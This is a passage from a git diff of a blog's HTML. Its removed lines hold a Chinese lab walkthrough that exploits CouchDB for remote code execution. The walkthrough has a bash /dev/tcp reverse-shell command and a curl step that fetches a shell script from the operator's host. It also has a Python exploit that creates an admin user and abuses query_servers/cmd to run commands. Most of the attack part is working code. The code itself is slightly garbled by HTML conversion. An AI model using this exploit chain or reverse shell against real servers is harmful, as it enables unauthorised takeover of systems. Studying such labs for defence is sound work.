（执行的命令），运行脚本即可执行对应的命令。<br>现在我们需要反弹一个可交互的Shell回操作机，本实验的思路是，在操作机中准备好反弹脚本并开启HTTP服务，然后利用EXP让目标 服务器 下载反弹脚本，接着，在操作机使用NC监听本地端口，最后利用EXP在目标服务器中执行反弹脚本，将Shell反弹至操作机监听的端口上，完成反弹Shell操作。<br>反弹Shell的命令，在经过数据库处理时不能直接执行，遂此处分为两步去实现<br>&emsp;<br>准备反弹脚本<br>cd 至 /home/目录下，使用Vim编辑器新建一个index.html文件，写入最终执行的命令，内容如下：<br>bash -i &gt;&amp; /dev/tcp/192.168.199.226/9000 0&gt;&amp;1 这里是本机ip<br><a href="https://imgchr.com/i/mA0ubq" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mA0ubq.png" alt="mA0ubq.png"></a><br>这条命令意思为创建一个可交互的bash和一个到192.168.199.226:9000的TCP链接，然后将bash的输入输出错误都重定向到在191.168.199.226:9000监听的进程中。<br>&emsp;<br>2.另起一个终端，在/home/目录下执行 python -m SimpleHTTPServer 8000 ,开启HTTP服务<br><a href="https://imgchr.com/i/mA0G24" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mA0G24.png" alt="mA0G24.png"></a><br>3.修改 exp.py 中的 command 的值为 curl 192.168.199.226:8000 -o /tmp/bashell ,保存并执行命令 python exp.py<br>&emsp;</p>
-<p>#!/usr/bin/env python3<br>import requests<br>from requests.auth import HTTPBasicAuth<br>&emsp;<br>target = ‘<a href="http://192.168.199.217:5984&#39;" target="_blank" rel="noopener">http://192.168.199.217:5984&#39;</a>      （这里是靶机ip）<br>command = ‘“curl 192.168.199.226:8000 -o /tmp/bashell”‘<br>version = 1<br>&emsp;<br>session = requests.session()<br>session.headers = {<br>    ‘Content-Type’: ‘application/json’<br>}</p>
-<h1 id="session-proxies"><a href="#session-proxies" class="headerlink" title="session.proxies = {"></a>session.proxies = {</h1><h1 id="‘http’-‘http-127-0-0-1-8085-39"><a href="#‘http’-‘http-127-0-0-1-8085-39" class="headerlink" title="‘http’: ‘http://127.0.0.1:8085&#39;"></a>‘http’: ‘<a href="http://127.0.0.1:8085&#39;" target="_blank" rel="noopener">http://127.0.0.1:8085&#39;</a></h1><h1 id><a href="#" class="headerlink" title="}"></a>}</h1><p>session.put(target + ‘/_users/org.couchdb.user:wooyun’, data=’’’{<br>  “type”: “user”,<br>  “name”: “wooyun”,<br>  “roles”: [“_admin”],<br>  “roles”: [],<br>  “password”: “wooyun”<br>}’’’)<br>&emsp;<br>session.auth = HTTPBasicAuth(‘wooyun’, ‘wooyun’)<br>&emsp;<br>if version == 1:<br>    session.put(target + (‘/_config/query_servers/cmd’), data=command)<br>else:<br>    host = session.get(target + ‘/_membership’).json()[‘all_nodes’][0]<br>    session.put(target + ‘/_node/{}/_config/query_servers/cmd’.format(host), data=command)<br>%emsp;<br>session.put(target + ‘/wooyun’)<br>session.put(target + ‘/wooyun/test’, data=’{“_id”: “wooyuntest”}’)<br>&emsp;<br>if version == 1:<br>    session.post(target + ‘/wooyun/_temp_view?limit=10’, data=’{“language”:”cmd”,”map”:””}’)<br>else:<br>    session.put(target + ‘/wooyun/_design/test’, data=’{“_id”:”_design/test”,”views”:{“wooyun”:{“map”:””} },”language”:”cmd”}’)<br>开启http服务<br><a href="https://imgchr.com/i/mABiLR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mABiLR.png" alt="mABiLR.png"></a><br>重新开启一台终端监听<br><a href="https://imgchr.com/i/mAB6YT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAB6YT.png" alt="mAB6YT.png"></a><br>修改 exp.py 中的 command 的值为 bash /tmp/bashell ,保存并执行命令 python exp.py ,成功获取反弹回来的Shell<br><a href="https://imgchr.com/i/mAB2pF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAB2pF.png" alt="mAB2pF.png"></a><br>在反弹回来的Shell中cd 到目录/tmp/下，可以看见运行Poc和Exp时存储的文件<br><a href="https://imgchr.com/i/mABfX9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mABfX9.png" alt="mABfX9.png"></a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1493,7 +1517,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-count">19</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1506,7 +1530,7 @@
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-count">19</span>
                   <span class="site-state-item-name">tags</span>
                 
               </div>
